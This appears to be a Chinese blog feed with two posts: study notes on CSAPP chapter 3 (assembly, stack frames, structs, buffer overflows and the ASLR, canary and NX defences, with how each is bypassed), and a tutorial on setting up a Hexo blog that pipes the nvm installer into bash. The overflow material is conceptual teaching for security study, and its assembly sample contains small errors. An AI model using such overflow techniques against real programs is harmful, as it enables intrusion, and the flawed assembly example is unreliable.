class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.L1:<br>    .quad .L2<br>    .quad .L3<br>    .quad .L4<br>    .quad .L5<br>    .quad .L6<br><br>test proc:<br>    movq $1,%rax<br>    subq $1,%rdi<br>    cmpq $3,%rdi<br>    ja L6<br>    jmp *.L1(,%rdi,8)<br>L2:<br>    addq $2,%rax<br>    jmp end<br>L3: <br>    subq $2,%rax<br>    jmp end<br>L4:<br>    mul $2,%rax<br>    jmp end<br>L5:<br>    div $2,%rax<br>    jmp end<br>L6:<br>    addq $1,%rax<br>end:<br>    ret<br>test endp<br></code></pre></td></tr></table></figure><p>我们可以看到跳转表的一个优势所在，对于每一个条件，都可以只进行一次判断就跳转到指定位置运行，当然我们实际在用的时候，可能会出现空语句，或者是滑落的情况（即语句下面没有 break），如果出现滑落，我们就删除对应语句块的 jmp 命令，如果出现空语句（case 后面没有语句），我们不新增加标签，而是直接设置跳转表的位置为下一个有值的标签。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>过程是软件中一种很重要的抽象。他提供了一种封装代码的方式，用一组指定的参数和一个可选的返回值实现了某种功能。然后我们可以在程序中不同的地方调用这个函数。</p><h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250425161958-mqb2h8b.png" alt="image"></p><p>我感觉学习pwn的没有不熟悉这张图的吧</p><p>C 语言调用机制的一个关键特性就是使用了栈结构提供的后进先出的管理原则。当P</p><p>调用Q的时候，我们需要保存P的状态，并为Q开辟出一块位置存放Q所需要的东西。当Q运行完返回P时，我们需要将Q占用的位置释放，并且恢复到调用Q函数之前的那种状态，除了rax用于保存返回值不需要恢复。</p><p>上面的图反映的状态就是调用Q时栈上的分布。</p><h3 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h3><p>在我们调用Q时，我们只需要把rip的值改为Q代码运行的地方就可以开始执行Q的指令，但是当Q执行结束，我们该继续执行P中的语句时，我们也该将rip中的值改到我们需要执行的P中的指令的地址。</p><p>这时候，就需要使用call指令</p><p>call指令的作用是先将当前指令下一步指令地址的值放入栈中（也就是我们说的返回地址），然后跳转到Q代码的地址开始执行，在Q执行结束之后调用ret，将之前放在栈上的返回地址放入到rip中</p><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p>众所周知，一般我们调用一个函数都是有参数的，例如int add(int a,int b),我们调用的时候格式就为add(3,4)</p><p>如果我们想运行这个函数，在调用到这个函数的时候就需要把参数也交给这个函数，所以我们得知道，我们是怎么将这个参数交给这个函数的</p><p>在x86-64架构的下，传参是由寄存器进行传参的：<strong>前六个参数分别传递给寄存器 %rdi,%rsi,%rdx,%rcx,%r8,%r9，若还有剩余参数，剩余参数从右往左依次入栈。</strong></p><h3 id="栈上的局部存储"><a href="#栈上的局部存储" class="headerlink" title="栈上的局部存储"></a>栈上的局部存储</h3><p>有些时候，局部数据必须存放在内存中，常见的情况：</p><p>1.寄存器不足够存放本地所有的本地数据</p><p>2.对一个局部变量使用地址运算符’&amp;’,因此必须能够为他产生一个地址</p><p>3.某些局部变量是数组或结构，因此必须能够通过数组或结构引用被访问到</p><h3 id="寄存器中的局部存储空间"><a href="#寄存器中的局部存储空间" class="headerlink" title="寄存器中的局部存储空间"></a>寄存器中的局部存储空间</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250417175323-mhvemb1.png" alt="image"></p><p>这是我们之前看过的图，在它上面写了调用者保存和被调用者保存，这是当我们在调用函数的时候，可能会修改一些寄存器的值，但是，当我们程序结束返回的时候，除了rax这些寄存器的值应该恢复到调用函数前的值，所以这些值是怎么保存的呢</p><p>调用者保存:调用函数的代码（调用者）负责保存那些在函数调用过程中可能被改变的寄存器。</p><p>在调用函数之前，调用者会先保存这些寄存器的值，通常是通过将寄存器的值压入栈中。被调用的函数执行时，会使用这些寄存器。如果被调用的函数修改了它们，调用者在返回时会从栈中恢复寄存器的值。</p><p>被调用者保存：被调用的函数负责保存它自己使用的寄存器</p><p>被调用的函数在开始时保存它需要使用的寄存器的值，通常将这些寄存器的值压入栈中。被调用的函数执行时，可以修改这些寄存器，但在函数返回之前，它必须恢复寄存器的原始值。</p><h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>C语言中的数组是一种将标量数据集成更大数据类型的方式。</p><h3 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h3><p>对于数据类型T和整形常熟N，起始位置为X，L为数据类型T的大小</p><p>如果我申明T A[N]</p><p>这表示我申请了一块LN大小的连续空间，起始位置是X，我们可以用0~N-1对这一空间的所有数进行索引。元素i的地址为X+i*L</p><p>例如：</p><p>int a[10],我们知道int类型大小为4字节，所以开辟了40个字节的空间存放a数组</p><p>假设起始位置为0x400000，那么a数组中每一个元素位置为0x400000+4*i</p><h3 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h3><p>C语言允许对指针进行运算，而计算出来的值会根据该指针引用的数据类型的大小进行伸缩。p+i 相当于 Xp+i*sizeof(type) 的地址（Xp 表示数组 p 的基地址）。</p><p>此外，书上还介绍了&amp;和*</p><p>&amp;为取地址符，根据这个名字，我们也该知道这个符号的作用是取出变量的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">例如<br>b=&amp;a；//这是将a变量存在的地址交给b<br></code></pre></td></tr></table></figure><p>*为解引用运算符，这个符号的作用是访问指针所指向的地址上的值</p><p>根据上个例子，现在b为a的地址，如果a的内容为5<br>那么*b就为5</p><h3 id="嵌套数组"><a href="#嵌套数组" class="headerlink" title="嵌套数组"></a>嵌套数组</h3><p>当我们定义了一个 int A[5][3] 时，相当于做了如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">row3_t</span>[<span class="hljs-number">3</span>];<br><span class="hljs-type">row3_t</span> A[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>将A看作一个有5个元素的数组，每个元素都是三个int的数组，所以关于A中元素的地址的计算公式为&amp;A[i][j]&#x3D;XA(起始地址)+4(int类型大小) *(5**i+j)</p><h2 id="异质的数据结"><a href="#异质的数据结" class="headerlink" title="异质的数据结"></a><span data-type="text" style="white-space-collapse: break-spaces;">异质的数据结</span></h2><p>C语言提供了两种将不同类型的对象组合到一起创建数据类型的机制:</p><p>1.结构(structure),用关键字 struct 来声明,将多个对象集合到一个单位中;</p><p>2.联合(union),用关键 字 union 来声明,允许用几种不同的类型来引用一个对象。</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>C语言的struct声明创建一个数据类型，将可能不同类型的对象聚合到一个对象中。用名字来引用结构的各个组成部分。类似于数组的实现,结构的所有组成部分都存放在内存中一段连续的区域内,而指向结构的指针就是结构第一个字节的地址。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">struct rec &#123;<br>int i;<br>int j;<br>int a [2];<br>int *p;<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后内存中的排列为</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250426214913-kmsaupa.png" alt="image">9</p><p>我们看到，我们将声明的数组嵌套在这个结构体空间中，尽管这些并不是同一个类型的数据，但是我们仍然将他存储到一个对象中，通过偏移进行查找</p><h3 id="联合"><a href="#联合" class="headerlink" title="联合"></a>联合</h3><p>联合提供了一种方式,能够规避C语言的类型系统,允许以多种类型来引用一个对 象。联合声明的语法与结构的语法一样,只不过语义相差比较大。它们是用不同的字段来引用相同的内存块。</p><p>联合和结构体不同的点在于，结构体为它声明的每个变量都分配了一个空间，但是联合是是大家共用的一个空间</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">union rec &#123;<br>int i;<br>int j;<br>int a [2];<br>int *p;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个例子和上一个相似，但是这个分配的空间就只有八（最大的那一个数据所分配的空间）所以它同一时间只允许一个数据存在在这个空间中</p><h3 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h3><p>对于 C 语言而言，为了方便内存管理会对数据类型做出这样的规定：大小为 n(n&lt;&#x3D;8) 的数据必须对齐在地址为 n 的倍数上，如果当前地址不符合要求则会往后顺延，中间的内存可能会因为填充产生浪费。</p><p>假设你有一个包含以下数据类型的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span> &#123;</span><br>    <span class="hljs-type">char</span> a;       <span class="hljs-comment">// 1 byte</span><br>    <span class="hljs-type">int</span> b;        <span class="hljs-comment">// 4 bytes</span><br>    <span class="hljs-type">char</span> c;       <span class="hljs-comment">// 1 byte</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>按我们之前学习的知识来看，他应该在空间中占据6个字节的空间，但是事实上，它占据了12个字节</p><p>为什么会占据12个字节，为了提高访问效率，结构体的内存对齐要求通常是其最大成员的对齐方式。即一个结构体的对齐方式是它最大成员类型的对齐大小</p><h2 id="在机器即程序中将控制与数据结合起来"><a href="#在机器即程序中将控制与数据结合起来" class="headerlink" title="在机器即程序中将控制与数据结合起来"></a>在机器即程序中将控制与数据结合起来</h2><p>好了，在前面学习了那么多的东西，到最后一点了，我们才开始看关于真正会在pwn里面利用的部分</p><h3 id="理解指针"><a href="#理解指针" class="headerlink" title="理解指针"></a>理解指针</h3><p>一些指针和它们映射到机器代码的关键原则：</p><ul><li><strong>每个指针都有一个类型</strong>：指针的类型决定了它指向的数据类型及其访问方式。</li><li><strong>每个指针都有一个值</strong>：指针存储的是一个内存地址，该地址指向实际的数据。</li><li><strong>指针用</strong>​ <strong>​<code>&amp;</code>​</strong> ​<strong>运算符创建</strong>：<code>&amp;</code>​ 运算符返回一个变量的地址，用于创建指针。</li><li>​ <strong>​<code>*</code>​</strong> ​ <strong>操作符用于间接引用指针</strong>：通过 <code>*</code>​ 运算符，可以访问指针指向的值（解引用）。</li><li><strong>数组与指针紧密联系</strong>：数组名本质上是指向数组首元素的指针，指针可以通过索引访问数组元素。</li><li><strong>将指针从一种类型强制转换成另一种类型，只改变它的类型，而不改变它的值</strong>：通过强制类型转换，你可以改变指针的类型，但指向的内存地址不变。</li><li><strong>指针也可以指向函数：</strong> 这提供了一个很强大的存储和向代码传递引用的功能,这些引用 可以被程序的某个其他部分调用。</li></ul><p>对于以下声明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> (*f)(<span class="hljs-type">int</span>*);<br></code></pre></td></tr></table></figure><p> 要从里(从“f”开始)往外读。因此,我们看到像<code>“(*f)”</code>​表明的那样,f是一个指针; 而<code>“(*f)(int* )”</code>​表明f是一个指向函数的指针,这个函数以一个int* 作为参数。 最后,我们看到,它是指向以 <code>int *</code>​ 为参数并返回 int 的函数的指针。</p><p> <code>*f </code>​两边的括号是必需的,否则声明变成<code> int *f(int*);</code>​ 它会被解读成 <code>(int *) f(int*);</code>​ 也就是说,它会被解释成一个函数原型,声明了一个函数,它以一个int * 作为参数 并返回一个int*。</p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>GNU 调试器 GDB 提供了许多有用的特性，允许我们机器级分析，具体可以用</p><p>plaintext</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$gdb file<br></code></pre></td></tr></table></figure><p>来进入 gdb shell 调试程序，输入 help 可以查看具体命令和效果，常见的有</p><table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td>run</td><td>运行程序（在此给出参数）</td></tr><tr><td>quit</td><td>退出</td></tr><tr><td>kill</td><td>杀死程序</td></tr><tr><td>b xxx</td><td>下断点</td></tr><tr><td>delete</td><td>删除断点</td></tr><tr><td>s</td><td>单步运行</td></tr><tr><td>si</td><td>机器级单步运行</td></tr><tr><td>n</td><td>步过运行</td></tr><tr><td>ni</td><td>步过运行</td></tr><tr><td>c</td><td>继续运行</td></tr><tr><td>finish</td><td>步过运行直到ret</td></tr><tr><td>disass</td><td>查看反汇编代码</td></tr><tr><td>p</td><td>打印数据</td></tr><tr><td>info register</td><td>查看寄存器</td></tr><tr><td>help</td><td>调出手册</td></tr></tbody></table><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>由于C对于数组引用不进行任何边界检查,而且局部变量和状态信息(例 如保存的寄存器值和返回地址)都存放在栈中。这两种情况结合到一起就能导致严重的程 序错误,对越界的数组元素的写操作会破坏存储在栈中的状态信息。当程序使用这个被破坏的状态,试图重新加载寄存器或执行 ret 指令时,就会出现很严重的错误。</p><p>一种特别常见的状态破坏称为缓冲区溢出(buffer overflow)。通常,在栈中分配某个 字符数组来保存一个字符串,但是字符串的长度超出了为数组分配的空间。</p><p>又得拿出这张图片了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-25%20161956-20250427004711-bz7enn8.png" alt="屏幕截图 2025-04-25 161956"></p><p>我们在函数被调用时的输入放在局部变量中，当我们的输入超过为它所分配的位置，将逐步占据栈上的被保存寄存器和返回地址（为什么向上增长，数据由低地址向高地址增长）。通过我们之前的学习得知，返回地址为被调用函数执行结束时要运行的指令地址，如果这时候我们修改这个地址为我们自己想要执行的位置（比如后门）就可以获得shell了</p><h3 id="对抗缓冲区溢出"><a href="#对抗缓冲区溢出" class="headerlink" title="对抗缓冲区溢出"></a>对抗缓冲区溢出</h3><p>为了对抗缓冲区溢出，研究出了几种对抗方法，这也是我们现在会遇到的保护机制</p><ol><li>栈随机化</li><li>栈破坏检测</li><li>栈不可执行</li></ol><p>一般情况下，程序每次运行的虚拟地址都是固定不变的，这样会使得程序更容易遭受攻击，栈随机化使得每次程序运行时栈的位置都有变化，这类技术我们成为 <strong>地址空间布局随机化（Address-Space Layout Randomization）</strong>  当然，有防御，就会有攻击方法。我们只需要在缓冲区中插入比较多的 nop 指令，那么我们只要任意命中一个 nop 都可以导致我们恶意代码的顺利执行。这个序列的常用术语是 nop sled 差不多就是一直滑过去。如果随机化的可能性达到了 2^21，那么如果命中位置只有一个的话，我们就要赌这 2^(-21) 的概率，这显然不太能被接受，假如我们插入了 255 字节的 nop，那么我们任意命中 256 中的其中一个，我们都可以执行成功，概率直接缩小到 2^13，这个数字大小能稍微被接受了。</p><p>第二个思路是在造成严重的后果之前尽可能检测到栈溢出了，思想就是往返回地址之前插入一段随机数，在函数即将返回的时候，检查这段随机数是否被更改，如果被更改，调用 __stack_chk_fail 函数进行异常处理终止程序运行。一般这个随机数我们称为 canary（<strong>金丝雀</strong>，实际在下矿的时候主要用于探测煤矿是否有毒），现在的 gcc 版本默认添加 canary，但是我们可以通过参数 -fno-stack-protector 参数关闭这个保护。</p><p>第三个思路就是<strong>NX（NO EXECUTE）</strong> 让栈中不可执行代码，我们往栈中插入代码的思想也就变的不可行了，但是我们仍然可以使用 ROP 的思想去绕过这一保护。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>终于写完了，好累，第一次文章，还是这么长的文章，参考了很多<a href="https://xia0ji233.pro/2022/09/22/CSAPP_3/">xia0ji233</a>师傅的内容和文章结构（师傅写得实在是太好了），我自己在读这一章的时候好多地方理解的不太清楚，参考了一些其他相关的文章和gpt给的解释，如果文章里面有什么错误，请一定要留言告诉我</p>]]></content>
    
    
    <categories>
      
      <category>书籍阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建一个属于自己的个人博客</title>
    <link href="/post/build-a-personal-blog-of-your-own-1qpsrd.html"/>
    <url>/post/build-a-personal-blog-of-your-own-1qpsrd.html</url>
    
    <content type="html"><![CDATA[<h1 id="搭建一个属于自己的个人博客"><a href="#搭建一个属于自己的个人博客" class="headerlink" title="搭建一个属于自己的个人博客"></a>搭建一个属于自己的个人博客</h1><p>最近感觉自己需要一个个人博客来记录一下自己写的东西，就开始和队里师傅dre4m一起开始搭建，第一次搭建个人博客真的是非常的困难，最后好在也是搭好了，写一篇文章记录一下。</p><p>感谢Wh1teJ0ker提供的方案，使用思源一键化上传文章到自己的个人博客，弄好了直接使用思源插件发布文章就可以了，真的非常方便。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="思源准备"><a href="#思源准备" class="headerlink" title="思源准备"></a>思源准备</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402135424.png" alt="image"></p><p>在你的思源里面下载这两个插件</p><h3 id="github准备"><a href="#github准备" class="headerlink" title="github准备"></a>github准备</h3><p>1.准备一个github账号，并创建一个yourname.github.io仓库</p><p>类似于这样</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402133756.png" alt="image"></p><p>我的github名为N1mbus-lock,就创建一个N1mbus-lock.github.io的仓库</p><p><a href="https://pages.github.com/">https://pages.github.com/</a></p><p>只在再在这个仓库里面写入你的index.html(名字必须得为index.html)，在进行访问<a href="https://n1mbus.github.io/">https://N1mbus.github.io</a> 就可以访问到你写的页面了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>N1mbus<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>N1mbus的个人主页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello ~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是一个简单的页面，你可以先在仓库里面放入一个index.html尝试一下是否能打开自己的页面</p><p>如果可以打开页面，就可以将这个文件删除了，在这个方案中，我们不需要手动向这个仓库中添加任何文件，会自动将编译号之后的文件放里面</p><p>2.然后创建一个存放你图片的仓库</p><p>在我的github中，我将这个仓库命名为Pic。</p><p>3.创建一个存放自己源码的仓库</p><p>我的存放源码的仓库叫做blog</p><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>由于我使用的是wsl是自带的git，所以不需要再下载git，如果想在windows环境下运行git，可以自己尝试在windows上下载git，但是听说很容易报错<a href="https://blog.csdn.net/yaorongke/article/details/119085413">git下载(Windows)</a></p><h3 id="安装NodeJS"><a href="#安装NodeJS" class="headerlink" title="安装NodeJS"></a>安装NodeJS</h3><p>如果在windows环境下安装NodeJS，请参考<a href="https://blog.csdn.net/yaorongke/article/details/119084295">NodeJS安装及配置(Windows)</a></p><p>我使用的方法是使用nvm安装安装NodeJS</p><ol><li><p>安装 <code>nvm</code>​：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash<br></code></pre></td></tr></table></figure></li><li><p>使 <code>nvm</code>​ 立即可用：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure></li><li><p>使用 <code>nvm</code>​ 安装 Node.js（例如安装最新版的 Node.js）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm install node  <span class="hljs-comment"># 安装最新的版本</span><br></code></pre></td></tr></table></figure><p> 或者安装特定版本：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm install 16  <span class="hljs-comment"># 安装 Node.js 16.x 版本</span><br></code></pre></td></tr></table></figure></li><li><p>设置默认版本（如果有多个版本）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm use node   <span class="hljs-comment"># 使用最新版本</span><br>nvm use 16     <span class="hljs-comment"># 使用 Node.js 16.x</span><br></code></pre></td></tr></table></figure></li><li><p>检查版本确认安装：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure></li></ol><p>但是nvm工具是国外的，可能下载失败（我采用的是给我的wsl使用镜像走我本机的代理）</p><p>可以使用apt下载NodeJS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install nodejs npm<br></code></pre></td></tr></table></figure><p>但是这样安装可能安装的版本不支持</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>好啦，准备工作弄好了，我们要开始搭建博客了</p><p>我使用的是采用Hexo搭建个人博客</p><p>安装 Hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo -v<br></code></pre></td></tr></table></figure><p>创建一个项目 hexo-blog 并初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init hexo-blog<br><span class="hljs-built_in">cd</span> hexo-blog<br>npm install<br></code></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g<br>hexo server<br></code></pre></td></tr></table></figure><p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402145619.png" alt="image"></p><p>是真的很简陋了，可以下载一个主题改改</p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>由于我只用过fluid，我就只介绍一下fluid吧</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">Fluid</a></p><p>去里面下载最新的release版本解压到thems目录并重命名为fluid</p><p>指定主题</p><p>如下修改 Hexo 博客目录中的 _config.yml：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">theme: fluid  <span class="hljs-comment"># 指定主题</span><br>language: zh-CN  <span class="hljs-comment"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p>创建「关于页」</p><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new page about<br></code></pre></td></tr></table></figure><p>创建成功后，编辑博客目录下 &#x2F;source&#x2F;about&#x2F;index.md，添加 layout 属性。</p><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154553.png" alt="image"></p><p>按这个修改（这个在这个文件的开头）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154337.png" alt="image"></p><p>这里把主题修改为fluid（文件的末尾处）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154443.png" alt="image"></p><p>这个在文件的末尾，repo是ssh</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154751.png" alt="image"></p><h3 id="thems-fluid-config-yml"><a href="#thems-fluid-config-yml" class="headerlink" title="&#x2F;thems&#x2F;fluid&#x2F;_config.yml"></a>&#x2F;thems&#x2F;fluid&#x2F;_config.yml</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155057.png" alt="image"></p><p>这里是修改浏览器导航的那个头像图案的,如下图</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402160452.png" alt="image"></p><p>​​</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155405.png" alt="image"></p><p>这里是修改打字效果的一些设置，我没改</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155601.png" alt="image"></p><p>这里修改的的是浏览器导航的文字</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155654.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155801.png" alt="image"></p><p>这里修改的是背景图</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155847.png" alt="image"></p><p>就是这个图</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155923.png" alt="image"></p><p>修改的是首页的文字，就是上面那个图中间的文字</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402160524.png" alt="image"></p><p>这是修改关于页的一些配置，avatar图片是下图中的那个小猫图片</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250402160626-z5bf1bm.png" alt="image"></p><p>这是我修改后的代码和样子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">about:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  banner_img: /img/default.png<br>  banner_img_height: 60<br>  banner_mask_alpha: 0.3<br>  avatar: /img/avatar.png<br>  name: <span class="hljs-string">&quot;喵喵喵~&quot;</span><br>  intro: <span class="hljs-string">&quot;你有小鱼干吗&quot;</span><br>  <span class="hljs-comment"># 更多图标可从 https://hexo.fluid-dev.com/docs/icon/ 查找，`class` 代表图标的 css class，添加 `qrcode` 后，图标不再是链接而是悬浮二维码</span><br>  <span class="hljs-comment"># More icons can be found from https://hexo.fluid-dev.com/docs/en/icon/  `class` is the css class of the icon. If adding `qrcode`, the icon is no longer a link, but a hovering QR code</span><br>  